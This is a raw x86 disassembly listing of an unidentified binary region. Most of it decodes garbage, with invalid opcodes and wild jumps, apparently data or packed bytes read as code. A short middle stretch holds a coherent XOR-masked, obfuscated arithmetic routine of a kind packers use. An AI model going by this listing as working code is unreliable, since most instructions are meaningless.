  4207f8:	mov    bh,0x60
  4207fa:	mov    edx,0x28949cd9
  4207ff:	loop   0x4207a3
  420801:	and    BYTE PTR [ecx+0x3f91ff87],cl
  420807:	mov    eax,0xe3d09886
  42080c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42080d:	pop    edx
  42080e:	sti    
  42080f:	add    BYTE PTR [edi-0xb],dh
  420812:	in     eax,0x37
  420814:	pusha  
  420815:	dec    esi
  420816:	mov    ds:0x322978ab,al
  42081b:	and    DWORD PTR [edi+0x442bf22e],ecx
  420821:	cmc    
  420822:	sbb    eax,0xc8f13f4d
  420827:	push   0xbda59c56
  42082c:	mov    DWORD PTR [eax+0x4d],esi
  42082f:	add    ch,BYTE PTR [ebx-0x4addf149]
  420835:	dec    edi
  420836:	mov    ch,0x8a
  420838:	loop   0x4207fc
  42083a:	xlat   BYTE PTR ds:[ebx]
  42083b:	test   dl,bh
  42083d:	push   esp
  42083e:	icebp  
  42083f:	fcmovne st,st(3)
  420841:	jle    0x42084d
  420843:	dec    esp
  420844:	pop    eax
  420845:	mov    al,0x35
  420847:	fcom   st(4)
  420849:	cdq    
  42084a:	aad    0xf4
  42084c:	mov    ch,0x83
  42084e:	ror    bl,1
  420850:	jne    0x42083b
  420852:	mov    ds:0xeebad54c,al
  420857:	int    0x6
  420859:	aad    0xdf
  42085b:	jecxz  0x42089b
  42085d:	mov    eax,0x7bd858d1
  420862:	xchg   edi,eax
  420863:	fwait
  420864:	in     eax,0x9
  420866:	inc    ebp
  420867:	test   ecx,esi
  420869:	jo     0x420853
  42086b:	cmp    al,dh
  42086d:	sub    al,0xb4
  42086f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420870:	push   ss
  420871:	xchg   ecx,eax
  420872:	in     eax,dx
  420873:	mov    ds:0x8a99a038,al
  420878:	pushf  
  420879:	and    al,0xbd
  42087b:	sahf   
  42087c:	xor    DWORD PTR [esi+ecx*2+0x69],ebx
  420880:	xor    al,0xc9
  420882:	jno    0x4208b4
  420884:	or     ah,BYTE PTR [edx]
  420886:	(bad)  
  420888:	mov    esi,0x23d33cb5
  42088d:	inc    edi
  42088e:	cmp    al,0x7
  420890:	fimul  WORD PTR [ebp+0xe]
  420893:	cmp    BYTE PTR [esi-0x11],ch
  420896:	push   DWORD PTR [eax-0x6266576]
  42089c:	push   ss
  42089d:	xor    DWORD PTR [esi-0x46],edi
  4208a0:	scas   al,BYTE PTR es:[edi]
  4208a1:	ret    0x74c8
  4208a4:	cmp    DWORD PTR [ecx],ebx
  4208a6:	call   0x24b726c3
  4208ab:	outs   dx,BYTE PTR ds:[esi]
  4208ac:	pavgb  mm0,QWORD PTR [ecx]
  4208af:	or     al,0x82
  4208b1:	inc    ebp
  4208b2:	lea    ebx,[esi+0x47]
  4208b5:	pusha  
  4208b6:	xchg   esp,eax
  4208b7:	and    dl,BYTE PTR [eax-0x5f46d319]
  4208bd:	xor    ebp,DWORD PTR [edi+ecx*4]
  4208c0:	imul   esp,DWORD PTR [edx],0xffffff99
  4208c3:	(bad)  
  4208c4:	aam    0x54
  4208c6:	out    0xc3,eax
  4208c8:	mov    BYTE PTR [edi],ch
  4208ca:	cli    
  4208cb:	sar    DWORD PTR [edi-0x70],1
  4208ce:	loopne 0x420930
  4208d0:	dec    esp
  4208d1:	mov    edi,0x46d92de9
  4208d6:	push   ecx
  4208d7:	ins    DWORD PTR es:[edi],dx
  4208d8:	xor    ch,BYTE PTR [ebp+0x7ff767f3]
  4208de:	std    
  4208df:	aaa    
  4208e0:	adc    DWORD PTR [edi+eiz*8+0x45580b94],edx
  4208e7:	pop    edx
  4208e8:	push   es
  4208e9:	pop    edx
  4208ea:	in     eax,0x37
  4208ec:	test   eax,0x42e4a7fc
  4208f1:	mov    edx,0x8ac4e889
  4208f6:	sar    dh,cl
  4208f8:	mov    ch,0xda
  4208fa:	mov    DWORD PTR [eax+0x6903df43],edi
  420900:	rol    DWORD PTR ds:[ebp-0x54cc7f6f],1
  420907:	xor    edi,edx
  420909:	xchg   ebp,eax
  42090a:	hlt    
  42090b:	jp     0x420894
  42090d:	aaa    
  42090e:	outs   dx,DWORD PTR ds:[esi]
  42090f:	(bad)  
  420910:	dec    ebx
  420911:	dec    esp
  420912:	mov    ebx,0x5a70cb93
  420917:	fdiv   st(5),st
  420919:	std    
  42091a:	jmp    0x4208bb
  42091c:	(bad)  
  42091d:	rcr    bh,cl
  42091f:	stos   BYTE PTR es:[edi],al
  420920:	sub    ebx,DWORD PTR [ebx+0x7c]
  420923:	repnz adc al,0x1b
  420926:	xor    al,al
  420928:	icebp  
  420929:	aas    
  42092a:	mov    esp,0xb5bfe173
  42092f:	mov    ds:0xb0071826,al
  420934:	rcl    esi,1
  420936:	and    BYTE PTR [eax+ebp*2],cl
  420939:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42093a:	ret    
  42093b:	jge    0x420986
  42093d:	inc    edx
  42093e:	cwde   
  42093f:	push   esi
  420940:	push   ss
  420941:	rol    BYTE PTR [edi-0xe36d03c],cl
  420947:	adc    ah,BYTE PTR [eax-0x58]
  42094a:	pop    ss
  42094b:	loop   0x42094d
  42094d:	push   eax
  42094e:	call   0x47e5:0x1cf45b30
  420955:	inc    BYTE PTR [eax-0x37]
  420958:	sti    
  420959:	stos   DWORD PTR es:[edi],eax
  42095a:	cmp    al,0x78
  42095c:	sbb    ah,BYTE PTR [esi+ecx*1+0x28]
  420960:	loopne 0x42097d
  420962:	scas   eax,DWORD PTR es:[edi]
  420963:	jp     0x42098f
  420965:	or     edi,DWORD PTR [edi]
  420967:	dec    eax
  420968:	dec    ebx
  420969:	sbb    ecx,esi
  42096b:	stc    
  42096c:	hlt    
  42096d:	cs lahf 
  42096f:	sahf   
  420970:	mov    edi,0x9ce66f75
  420975:	(bad)  
  420976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420977:	xor    bh,bl
  420979:	ss pop edx
  42097b:	je     0x420985
  42097d:	mov    ds:0xb45ce065,eax
  420982:	mov    al,0x8c
  420984:	dec    esi
  420985:	fisubr WORD PTR [ecx]
  420987:	ins    BYTE PTR es:[edi],dx
  420988:	pop    ds
  420989:	sub    al,0x78
  42098b:	mov    eax,ds:0x8091a18a
  420990:	ret    0xa941
  420993:	adc    eax,0x9906ccb6
  420998:	sub    al,bl
  42099a:	sub    eax,0x82631320
  42099f:	push   ecx
  4209a0:	mov    esi,DWORD PTR [ebp+0x315532cb]
  4209a6:	inc    eax
  4209a7:	daa    
  4209a8:	add    eax,0x30ce019c
  4209ad:	push   ds
  4209ae:	dec    esi
  4209af:	retf   
  4209b0:	mov    ds:0xdd687c2e,al
  4209b5:	mov    al,ds:0x368a41e4
  4209ba:	jg     0x4209a4
  4209bc:	out    dx,eax
  4209bd:	xchg   ebx,eax
  4209be:	jne    0x420a25
  4209c0:	xchg   esp,eax
  4209c1:	and    edx,edi
  4209c3:	mov    edi,0x123bb77d
  4209c8:	aam    0xd5
  4209ca:	pop    esi
  4209cb:	sub    dh,al
  4209cd:	int3   
  4209ce:	bound  eax,QWORD PTR [edi]
  4209d0:	popa   
  4209d1:	add    DWORD PTR [edx+0x6b64e7b0],esi
  4209d7:	lods   eax,DWORD PTR ds:[esi]
  4209d8:	and    dl,BYTE PTR [edi]
  4209da:	pop    ecx
  4209db:	cmp    DWORD PTR [esp+esi*2+0x4eb7325f],esp
  4209e2:	fnstenv [edi+ebp*1+0x1c]
  4209e6:	addr16 pop ebx
  4209e8:	mov    dl,0x3f
  4209ea:	mov    edx,0x25274a98
  4209ef:	cdq    
  4209f0:	je     0x420987
  4209f2:	leave  
  4209f3:	out    0xd6,al
  4209f5:	xor    dh,BYTE PTR [eax]
  4209f7:	in     al,0x77
  4209f9:	jne    0x4209bb
  4209fb:	ins    DWORD PTR es:[edi],dx
  4209fc:	loop   0x4209cd
  4209fe:	ret    
  4209ff:	inc    edx
  420a00:	push   eax
  420a01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a02:	ficomp DWORD PTR [ebp+0x2]
  420a05:	mov    esi,DWORD PTR [eax-0x3daaaee1]
  420a0b:	jnp    0x420a18
  420a0d:	pusha  
  420a0e:	int3   
  420a0f:	or     esp,edi
  420a11:	sub    eax,0xe66d8001
  420a16:	sub    eax,0x5d17c3a7
  420a1b:	jmp    0x420a8b
  420a1d:	jmp    0xe708c405
  420a22:	sbb    BYTE PTR [ebp+0x46527dc9],0x6b
  420a29:	test   esi,ebx
  420a2b:	sub    ecx,esp
  420a2d:	xlat   BYTE PTR ds:[ebx]
  420a2e:	daa    
  420a2f:	mov    ecx,0x2092673
  420a34:	mov    ah,0x97
  420a36:	popf   
  420a37:	push   edi
  420a38:	frstor [esi+0xd]
  420a3b:	mov    ds:0xc92f0b8a,eax
  420a40:	popa   
  420a41:	pusha  
  420a42:	ss out dx,eax
  420a44:	scas   eax,DWORD PTR es:[edi]
  420a45:	mov    edi,eax
  420a47:	js     0x4209e0
  420a49:	and    BYTE PTR [ebx-0x5],ch
  420a4c:	(bad)  
  420a4d:	sub    DWORD PTR [edx],esi
  420a4f:	nop
  420a50:	adc    DWORD PTR [edx+0x69],edx
  420a53:	gs loopne 0x420a5e
  420a56:	ret    0xe916
  420a59:	cs pop es
  420a5b:	jecxz  0x420acd
  420a5d:	leave  
  420a5e:	add    DWORD PTR [eax+0x1f],esi
  420a61:	cdq    
  420a62:	ja     0x420a0e
  420a64:	lods   al,BYTE PTR ds:[esi]
  420a65:	mov    bl,0x29
  420a67:	aad    0x9f
  420a69:	sbb    edx,ebp
  420a6b:	ror    DWORD PTR [esi+eiz*8+0x36745ced],cl
  420a72:	xor    edx,eax
  420a74:	jb     0x420af5
  420a76:	sar    esi,cl
  420a78:	or     al,0x67
  420a7a:	pop    edi
  420a7b:	ja     0x420a8e
  420a7d:	mov    ah,0x5b
  420a7f:	hlt    
  420a80:	fistp  WORD PTR [eax]
  420a82:	cdq    
  420a83:	cmp    bl,al
  420a85:	mov    ?,WORD PTR [esp+eiz*2-0x64]
  420a89:	mov    DWORD PTR [eax],edi
  420a8b:	or     bh,ch
  420a8d:	sbb    ebp,DWORD PTR [esi-0x4e]
  420a90:	pop    edx
  420a91:	or     DWORD PTR [ecx+0x7f624eb],edx
  420a97:	shl    ebx,cl
  420a99:	out    0xff,eax
  420a9b:	retf   
  420a9c:	mov    ds:0xfba9a1ce,al
  420aa1:	fsub   QWORD PTR [esi-0x4f]
  420aa4:	les    ebp,FWORD PTR [ecx-0x8b9371]
  420aaa:	mov    ds:0x498820d2,al
  420aaf:	rcl    BYTE PTR [ecx-0x3b7a5a28],1
  420ab5:	and    eax,0x599d0903
  420aba:	js     0x420b03
  420abc:	xor    edx,DWORD PTR [ebx]
  420abe:	inc    ebx
  420abf:	repnz ins BYTE PTR es:[edi],dx
  420ac1:	push   0x60
  420ac3:	jp     0x420ae0
  420ac5:	mov    ah,dl
  420ac7:	shr    BYTE PTR [eax],1
  420ac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aca:	jecxz  0x420af9
  420acc:	arpl   ax,cx
  420ace:	add    eax,0x8d6869f2
  420ad3:	and    DWORD PTR [ecx+0x9ea3d87],0xffffff84
  420ada:	pushf  
  420adb:	xchg   ebx,eax
  420adc:	xchg   ebp,eax
  420add:	inc    esp
  420ade:	mov    ah,0xe7
  420ae0:	(bad)  
  420ae1:	sub    dl,cl
  420ae3:	rcl    BYTE PTR [esi+0x1b],cl
  420ae6:	mov    dl,0x71
  420ae8:	pop    esi
  420ae9:	dec    ebx
  420aea:	ins    DWORD PTR es:[edi],dx
  420aeb:	enter  0x60d1,0xa0
  420aef:	push   esi
  420af0:	and    DWORD PTR ds:0x47b5e108,esp
  420af6:	in     al,dx
  420af7:	and    eax,0xd1edb4d0
  420afc:	sbb    eax,0x33a1b300
  420b01:	inc    ebp
  420b02:	and    esp,DWORD PTR [ecx+edx*2-0x36]
  420b06:	(bad)  
  420b07:	fstp   QWORD PTR [edi*2-0x3af49260]
  420b0e:	repz jo 0x420b24
  420b11:	or     esp,DWORD PTR [esi+0x48]
  420b14:	test   eax,0xbc0f00c8
  420b19:	xor    eax,0xfb6fc62e
  420b1e:	lahf   
  420b1f:	sub    BYTE PTR [eax-0x325c1897],0x5c
  420b26:	int3   
  420b27:	push   ebx
  420b28:	push   eax
  420b29:	test   eax,0x7b6f162d
  420b2e:	dec    esi
  420b2f:	push   cs
  420b30:	call   0x37346906
  420b35:	std    
  420b36:	sbb    ebx,esi
  420b38:	xchg   DWORD PTR [ecx+0x60],esp
  420b3b:	inc    ebx
  420b3c:	inc    edi
  420b3d:	ficomp WORD PTR [ebp-0x78]
  420b40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b41:	adc    bh,BYTE PTR [eax+0x5c]
  420b44:	adc    BYTE PTR [ebx+0x638a56b4],ah
  420b4a:	jmp    0xa9d3:0x7f36c53a
  420b51:	add    ebp,DWORD PTR [ecx]
  420b53:	add    DWORD PTR [edi+0x7465dbae],0x8810cc2a
  420b5d:	mov    ebx,0xd88f176b
  420b62:	fs mov bl,0x27
  420b65:	ret    0xf2bd
  420b68:	pushf  
  420b69:	rcr    esp,1
  420b6b:	cmp    bl,BYTE PTR [edi-0x3cb351aa]
  420b71:	jmp    0x420b52
  420b73:	std    
  420b74:	jnp    0x420b5c
  420b76:	(bad)  [ebx-0x75eb758c]
  420b7c:	pop    ss
  420b7d:	div    BYTE PTR [edi-0x15]
  420b80:	(bad)  
  420b81:	adc    ecx,DWORD PTR [ebp+0x76]
  420b84:	pop    ss
  420b85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b86:	test   BYTE PTR [ecx],cl
  420b88:	sbb    al,0x39
  420b8a:	stc    
  420b8b:	or     BYTE PTR [ebp+eax*2-0x720325d7],0x6f
  420b93:	mov    ecx,0xcecdd564
  420b98:	xchg   edi,eax
  420b99:	adc    BYTE PTR ds:0xe9af4f4b,bl
  420b9f:	inc    edx
  420ba0:	push   0x86ca4595
  420ba5:	mov    ah,0xf2
  420ba7:	dec    esp
  420ba8:	mov    bh,cl
  420baa:	add    BYTE PTR [edi],ah
  420bac:	inc    ebp
  420bad:	ret    0xeefa
  420bb0:	fild   WORD PTR [edi]
  420bb2:	mov    bl,0x7e
  420bb4:	xchg   ecx,eax
  420bb5:	sbb    al,0x1d
  420bb7:	dec    ebp
  420bb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bb9:	jnp    0x420c27
  420bbb:	inc    ecx
  420bbc:	jns    0x420b91
  420bbe:	sub    BYTE PTR [eax+0x7a],dh
  420bc1:	push   ecx
  420bc2:	xor    dl,BYTE PTR [ebx]
  420bc4:	es push edx
  420bc6:	arpl   bp,cx
  420bc8:	fisttp DWORD PTR [ebx+0x202b868c]
  420bce:	test   BYTE PTR [eax],ah
  420bd0:	sbb    BYTE PTR [eax+0x69],al
  420bd3:	adc    eax,0x3ea27a8a
  420bd8:	(bad)
  420bdc:	repnz sbb eax,0xacd02ef6
  420be2:	xor    al,0xb2
  420be4:	leavew 
  420be6:	(bad)  
  420be7:	arpl   WORD PTR [eax+0x31],cx
  420bea:	out    0x43,eax
  420bec:	and    DWORD PTR [eax-0x2f],edi
  420bef:	mov    eax,ds:0x29d9c6fb
  420bf4:	jnp    0x420bdb
  420bf6:	pop    ebx
  420bf7:	pop    edx
  420bf8:	push   edx
  420bf9:	push   ebx
  420bfa:	daa    
  420bfb:	push   esi
  420bfc:	add    esi,DWORD PTR [esi-0xf]
  420bff:	xlat   BYTE PTR ds:[ebx]
  420c00:	shl    edi,0x26
  420c03:	scas   al,BYTE PTR es:[edi]
  420c04:	inc    esp
  420c05:	mov    esp,DWORD PTR [edi-0x2b]
  420c08:	icebp  
  420c09:	(bad)  
  420c0a:	lahf   
  420c0b:	push   0x7e62ddc3
  420c10:	mov    eax,ds:0x1fe10741
  420c15:	(bad)  
  420c16:	push   eax
  420c17:	inc    eax
  420c18:	adc    al,0x9c
  420c1a:	cmp    DWORD PTR [esi+0x64],ebp
  420c1d:	les    esi,FWORD PTR es:[edx]
  420c20:	scas   al,BYTE PTR es:[edi]
  420c21:	mov    eax,ss
  420c23:	adc    bh,dl
  420c25:	add    eax,0x87ae4ab
  420c2a:	mov    ds:0x1b66bd60,eax
  420c2f:	shr    ebp,1
  420c31:	adc    BYTE PTR [eax-0x5aa1632a],cl
  420c37:	not    ecx
  420c39:	inc    edx
  420c3a:	int3   
  420c3b:	mov    al,0x7a
  420c3d:	iret   
  420c3e:	jno    0x420ca6
  420c40:	xor    al,0x80
  420c42:	push   esp
  420c43:	outs   dx,BYTE PTR ds:[esi]
  420c44:	xor    BYTE PTR [esi-0x6bc59c04],0x5f
  420c4b:	add    bh,BYTE PTR [ecx]
  420c4d:	call   0x5c9356f1
  420c52:	xchg   edi,eax
  420c53:	in     eax,0x76
  420c55:	out    dx,eax
  420c56:	test   BYTE PTR [eax-0x72],dh
  420c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c5a:	dec    ebp
  420c5b:	sbb    DWORD PTR [eax-0x14],ebx
  420c5e:	jmp    0xc5e3ca61
  420c63:	sub    eax,0xb3ce49ef
  420c68:	pusha  
  420c69:	shl    DWORD PTR [ecx-0x78319c],0xdc
  420c70:	ja     0x420c0b
  420c72:	(bad)  
  420c73:	ins    BYTE PTR es:[edi],dx
  420c74:	fwait
  420c75:	xchg   cl,cl
  420c77:	xchg   esp,eax
  420c78:	adc    eax,ecx
  420c7a:	xchg   ecx,eax
  420c7b:	xor    al,0xd9
  420c7d:	pop    esp
  420c7e:	jmp    0xfeeb:0x88c8bc57
  420c85:	pxor   mm3,QWORD PTR gs:[esi-0x13b2a132]
  420c8d:	cmp    BYTE PTR [edx+0x50c981bc],0x84
  420c94:	sub    bl,BYTE PTR [ecx-0x670f0e45]
  420c9a:	mov    al,0x27
  420c9c:	push   esi
  420c9d:	push   cs
  420c9e:	popa   
  420c9f:	or     DWORD PTR [edi+edx*1],ebx
  420ca2:	adc    DWORD PTR [ecx],0x6f
  420ca5:	test   eax,0x6b0c0634
  420caa:	jp     0x420c2d
  420cac:	add    edx,DWORD PTR [ebx-0x1d]
  420caf:	out    dx,eax
  420cb0:	test   edx,esp
  420cb2:	jae    0x420ca3
  420cb4:	mov    eax,ds:0x3cd8bfc9
  420cb9:	xor    bh,BYTE PTR [edx]
  420cbb:	lahf   
  420cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cbd:	jmp    0x25e9afae
  420cc2:	and    BYTE PTR [esi+edx*1+0x64],cl
  420cc6:	jno    0x420d45
  420cc8:	pop    ebx
  420cc9:	es ins DWORD PTR es:[edi],dx
  420ccb:	js     0x420ce5
  420ccd:	mov    bh,0x29
  420ccf:	retf   0x209a
  420cd2:	sbb    al,BYTE PTR [ebx-0x14]
  420cd5:	aaa    
  420cd6:	das    
  420cd7:	mov    ds:0xbf940b02,al
  420cdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cdd:	mov    edi,0x416f3c42
  420ce2:	ins    DWORD PTR es:[edi],dx
  420ce3:	es dec ecx
  420ce5:	sahf   
  420ce6:	inc    ebp
  420ce7:	cmp    eax,DWORD PTR [esi]
  420ce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cea:	cwde   
  420ceb:	or     ch,BYTE PTR [edx]
  420ced:	or     esp,ebp
  420cef:	mov    esi,DWORD PTR [eax]
  420cf1:	lods   eax,DWORD PTR ds:[esi]
  420cf2:	xor    al,0x4d
  420cf4:	mov    eax,ds:0x19af3955
  420cf9:	sbb    ebx,DWORD PTR [ebx+0x27]
  420cfc:	or     al,0xdf
  420cfe:	js     0x420d3c
  420d00:	inc    edi
  420d01:	(bad)  
  420d03:	imul   ebx,esp,0x161648b2
  420d09:	or     al,0x34
  420d0b:	test   BYTE PTR [ebx],cl
  420d0d:	aaa    
  420d0e:	pop    edi
  420d0f:	imul   DWORD PTR [esi+0x79]
  420d12:	dec    eax
  420d13:	pushf  
  420d14:	ret    0x33e7
  420d17:	sti    
  420d18:	mov    DWORD PTR [edx],edi
  420d1a:	mov    edx,DWORD PTR [ebp+0x8]
  420d1d:	xor    edx,eax
  420d1f:	inc    ecx
  420d20:	inc    DWORD PTR [ebp-0x18]
  420d23:	add    edx,esi
  420d25:	cmp    ecx,edx
  420d27:	jb     0x41e963
  420d2d:	jmp    0x420d77
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	mov    DWORD PTR [ebp+0x8],ecx
  420d38:	jmp    0x420d6a
  420d3d:	mov    ecx,DWORD PTR [ebp+0x8]
  420d40:	mov    edx,DWORD PTR [ebp-0x8]
  420d43:	xor    ecx,eax
  420d45:	xor    edx,eax
  420d47:	sub    ecx,edx
  420d49:	sub    ecx,esi
  420d4b:	xor    ecx,eax
  420d4d:	mov    DWORD PTR [ebp+0x8],ecx
  420d50:	mov    ecx,DWORD PTR [ebp+0x8]
  420d53:	mov    edx,DWORD PTR [ebp+0x8]
  420d56:	imul   edx,edx,0x5708f2
  420d5c:	xor    ecx,eax
  420d5e:	add    ecx,esi
  420d60:	lea    ecx,[ebp+ecx*4-0x64]
  420d64:	mov    edi,DWORD PTR [ecx]
  420d66:	add    edx,edi
  420d68:	mov    DWORD PTR [ecx],edx
  420d6a:	mov    ecx,DWORD PTR [ebp+0x8]
  420d6d:	xor    ecx,eax
  420d6f:	add    ecx,esi
  420d71:	jne    0x420d3d
  420d77:	mov    ecx,DWORD PTR [ebp-0xc]
  420d7a:	mov    DWORD PTR [ebp+0x8],ecx
  420d7d:	jmp    0x420daf
  420d82:	mov    ecx,DWORD PTR [ebp+0x8]
  420d85:	mov    edx,DWORD PTR [ebp-0x8]
  420d88:	xor    ecx,eax
  420d8a:	xor    edx,eax
  420d8c:	sub    ecx,edx
  420d8e:	sub    ecx,esi
  420d90:	xor    ecx,eax
  420d92:	mov    DWORD PTR [ebp+0x8],ecx
  420d95:	mov    ecx,DWORD PTR [ebp+0x8]
  420d98:	mov    edx,DWORD PTR [ebp+0x8]
  420d9b:	imul   edx,edx,0x5708f2
  420da1:	xor    ecx,eax
  420da3:	add    ecx,esi
  420da5:	lea    ecx,[ebp+ecx*4-0x64]
  420da9:	mov    edi,DWORD PTR [ecx]
  420dab:	add    edx,edi
  420dad:	mov    DWORD PTR [ecx],edx
  420daf:	mov    ecx,DWORD PTR [ebp+0x8]
  420db2:	xor    ecx,eax
  420db4:	add    ecx,esi
  420db6:	jne    0x420d82
  420dbc:	mov    ecx,DWORD PTR [ebp-0x8]
  420dbf:	mov    edx,DWORD PTR [ebp-0x20]
  420dc2:	xor    ecx,eax
  420dc4:	lea    ecx,[ecx+edx*1+0x3272dd]
  420dcb:	mov    DWORD PTR [ebp-0x20],ecx
  420dce:	inc    DWORD PTR [ebp+0xc]
  420dd1:	mov    ecx,DWORD PTR [ebp-0x1c]
  420dd4:	xor    ecx,eax
  420dd6:	add    ecx,esi
  420dd8:	jne    0x413678
  420dde:	jmp    0x420e67
  420de3:	mov    ecx,DWORD PTR [ebp-0xc]
  420de6:	mov    DWORD PTR [ebp+0x8],ecx
  420de9:	jmp    0x420e1b
  420dee:	mov    ecx,DWORD PTR [ebp+0x8]
  420df1:	mov    edx,DWORD PTR [ebp-0x8]
  420df4:	xor    ecx,eax
  420df6:	xor    edx,eax
  420df8:	sub    ecx,edx
  420dfa:	sub    ecx,esi
  420dfc:	xor    ecx,eax
  420dfe:	mov    DWORD PTR [ebp+0x8],ecx
  420e01:	mov    ecx,DWORD PTR [ebp+0x8]
  420e04:	mov    edx,DWORD PTR [ebp+0x8]
  420e07:	imul   edx,edx,0x5708f2
  420e0d:	xor    ecx,eax
  420e0f:	add    ecx,esi
  420e11:	lea    ecx,[ebp+ecx*4-0x64]
  420e15:	mov    edi,DWORD PTR [ecx]
  420e17:	add    edx,edi
  420e19:	mov    DWORD PTR [ecx],edx
  420e1b:	mov    ecx,DWORD PTR [ebp+0x8]
  420e1e:	xor    ecx,eax
  420e20:	add    ecx,esi
  420e22:	jne    0x420dee
  420e28:	jmp    0x420e73
  420e2d:	mov    ecx,DWORD PTR [ebp+0x8]
  420e30:	mov    edx,DWORD PTR [ebp-0x8]
  420e33:	xor    ecx,eax
  420e35:	xor    edx,eax
  420e37:	sub    ecx,edx
  420e39:	sub    ecx,esi
  420e3b:	xor    ecx,eax
  420e3d:	mov    DWORD PTR [ebp+0x8],ecx
  420e40:	mov    ecx,DWORD PTR [ebp+0x8]
  420e43:	mov    edx,DWORD PTR [ebp+0x8]
  420e46:	xor    ecx,eax
  420e48:	imul   edx,edx,0x5708f2
  420e4e:	add    ecx,esi
  420e50:	lea    ecx,[ebp+ecx*4-0x64]
  420e54:	mov    edi,DWORD PTR [ecx]
  420e56:	add    edx,edi
  420e58:	mov    DWORD PTR [ecx],edx
  420e5a:	mov    ecx,DWORD PTR [ebp+0x8]
  420e5d:	xor    ecx,eax
  420e5f:	add    ecx,esi
  420e61:	jne    0x420e2d
  420e67:	mov    ecx,DWORD PTR [ebp-0x8]
  420e6a:	xor    ecx,eax
  420e6c:	mov    eax,DWORD PTR [ebp+0x10]
  420e6f:	add    ecx,esi
  420e71:	mov    DWORD PTR [eax],ecx
  420e73:	pop    edi
  420e74:	pop    esi
  420e75:	pop    ebx
  420e76:	leave  
  420e77:	ret    0xc
  420e7a:	dec    ebp
  420e7b:	and    eax,0x55210010
  420e80:	adc    BYTE PTR [eax],al
  420e82:	call   DWORD PTR [ebp+0x10]
  420e85:	add    bh,al
  420e87:	adc    BYTE PTR ss:[eax],al
  420e8a:	cld    
  420e8b:	ins    BYTE PTR es:[edi],dx
  420e8c:	adc    BYTE PTR [eax],al
  420e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e8f:	js     0x420ea1
  420e91:	add    BYTE PTR [ebx+eiz*2],al
  420e94:	adc    BYTE PTR [eax],al
  420e96:	dec    edi
  420e97:	jae    0x420ea9
  420e99:	add    ah,bl
  420e9b:	sub    eax,0x6ed60010
  420ea0:	adc    BYTE PTR [eax],al
  420ea2:	cmp    BYTE PTR [ecx],al
  420ea4:	adc    BYTE PTR [eax],al
  420ea6:	cwde   
  420ea7:	cmovb  eax,DWORD PTR [eax]
  420eaa:	pushf  
  420eab:	cmovb  eax,DWORD PTR [eax]
  420eae:	mov    al,ds:0xa400420f
  420eb3:	cmovb  eax,DWORD PTR [eax]
  420eb6:	test   al,0xf
  420eb8:	inc    edx
  420eb9:	add    BYTE PTR [edi+ecx*1+0xfb00042],ch
  420ec0:	inc    edx
  420ec1:	add    BYTE PTR [edi+ecx*1+0x42],dh
	...
  420ed4:	dec    edx
  420ed5:	aam    0xb3
  420ed7:	dec    ebp
  420ed8:	add    BYTE PTR [eax],al
  420eda:	add    BYTE PTR [eax],al
  420edc:	add    al,BYTE PTR [eax]
  420ede:	add    BYTE PTR [eax],al
  420ee0:	cmp    eax,0xc0000000
  420ee5:	lar    eax,WORD PTR [eax]
  420ee8:	rol    BYTE PTR [ebx],0x2
  420eeb:	add    BYTE PTR [edx+0xe],al
  420eee:	adc    BYTE PTR [eax],al
  420ef0:	pop    esp
  420ef1:	sbb    edx,DWORD PTR [eax]
  420ef3:	add    BYTE PTR [ebx-0x4dffefb0],cl
  420ef9:	sub    eax,0x29930010
  420efe:	adc    BYTE PTR [eax],al
  420f00:	mov    al,ds:0x5900101f
  420f05:	push   ebp
  420f06:	adc    BYTE PTR [eax],al
  420f08:	ret    0x102d
  420f0b:	add    BYTE PTR [edx+0xe],bh
  420f0e:	inc    edx
  420f0f:	add    BYTE PTR [esi+0xe],bh
  420f12:	inc    edx
  420f13:	add    BYTE PTR [edx-0x79ffbdf2],al
  420f19:	push   cs
  420f1a:	inc    edx
  420f1b:	add    BYTE PTR [edx-0x71ffbdf2],cl
  420f21:	push   cs
  420f22:	inc    edx
  420f23:	add    BYTE PTR [edx-0x69ffbdf2],dl
  420f29:	push   cs
  420f2a:	inc    edx
  420f2b:	add    BYTE PTR [edx-0x61ffbdf2],bl
  420f31:	push   cs
  420f32:	inc    edx
  420f33:	add    BYTE PTR [edx+0x5800420e],ah
  420f39:	cmovb  eax,DWORD PTR [eax]
  420f3c:	pop    esp
  420f3d:	cmovb  eax,DWORD PTR [eax]
  420f40:	pusha  
  420f41:	cmovb  eax,DWORD PTR [eax]
  420f44:	cmovb  eax,DWORD PTR fs:[eax]
  420f48:	push   0x6c00420f
  420f4d:	cmovb  eax,DWORD PTR [eax]
  420f50:	jo     0x420f61
  420f52:	inc    edx
  420f53:	add    BYTE PTR [edi+ecx*1+0x42],dh
  420f57:	add    al,cl
  420f59:	cmp    edx,DWORD PTR [eax]
  420f5b:	add    BYTE PTR [ecx+0x25],dh
  420f5e:	adc    BYTE PTR [eax],al
  420f60:	fld    TBYTE PTR [ecx]
  420f62:	adc    BYTE PTR [eax],al
  420f64:	xchg   edi,eax
  420f65:	sub    al,0x10
  420f67:	add    dh,ah
  420f69:	aaa    
  420f6a:	adc    BYTE PTR [eax],al
  420f6c:	and    eax,0xd5001051
  420f71:	xor    dl,BYTE PTR [eax]
  420f73:	add    BYTE PTR [eax-0x13ffefd8],ch
  420f79:	push   cs
  420f7a:	inc    edx
  420f7b:	add    al,dh
  420f7d:	push   cs
  420f7e:	inc    edx
  420f7f:	add    ah,dh
  420f81:	push   cs
  420f82:	inc    edx
  420f83:	add    al,bh
  420f85:	push   cs
  420f86:	inc    edx
  420f87:	add    ah,bh
  420f89:	push   cs
  420f8a:	inc    edx
  420f8b:	add    BYTE PTR [eax],al
